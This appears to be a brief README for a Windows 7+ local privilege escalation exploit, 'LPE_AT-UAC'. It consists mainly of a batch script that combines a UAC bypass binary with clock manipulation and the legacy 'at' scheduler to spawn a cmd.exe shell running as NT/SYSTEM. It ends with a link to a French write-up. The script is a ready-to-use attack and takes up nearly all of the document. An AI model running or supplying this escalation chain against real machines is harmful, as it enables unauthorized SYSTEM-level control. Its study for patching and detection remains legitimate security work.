# LPE_AT-UAC
Windows 7+ Local Privilege Escalation AT - BypassUAC

How to open a local NT/SYSTEM prompt shell "cmd.exe" on Win7+ through the oldschool "at" method.

atuac.bat content :

```shell
@echo off
set BYPASSUACPATH=C:\bypassuac.exe
set REMOTEPATH=C:\remotex64.exe
set tmptime=%TIME%
%BYPASSUACPATH% /c time 13:37:57,44
%BYPASSUACPATH% /c at 13:38 %REMOTEPATH% /s cmd SYSCMD
ping 127.0.0.1 -n 3 > NUL
%BYPASSUACPATH% /c time %tmptime%
%REMOTEPATH% /c %COMPUTERNAME% SYSCMD
```

* Details (in french) :
    * https://www.asafety.fr/vuln-exploit-poc/windows-vista7-escalade-de-privilege-via-at-et-bypass-uac/

